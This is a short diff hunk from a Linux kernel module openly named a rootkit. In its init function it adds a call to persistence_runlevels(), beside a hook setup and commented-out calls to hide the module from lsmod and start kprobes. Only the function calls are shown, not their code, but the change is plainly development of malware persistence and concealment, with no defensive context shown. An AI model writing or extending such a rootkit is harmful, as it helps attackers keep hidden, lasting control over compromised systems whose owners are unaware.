@@ -11,6 +11,7 @@ static int __init rootkit_init(void) {
 
   printk(KERN_INFO "rootkit: init\n");
   
+  persistence_runlevels();
   rootkit_init_hook();
   //hide_from_lsmod();
   //kprobes_init();
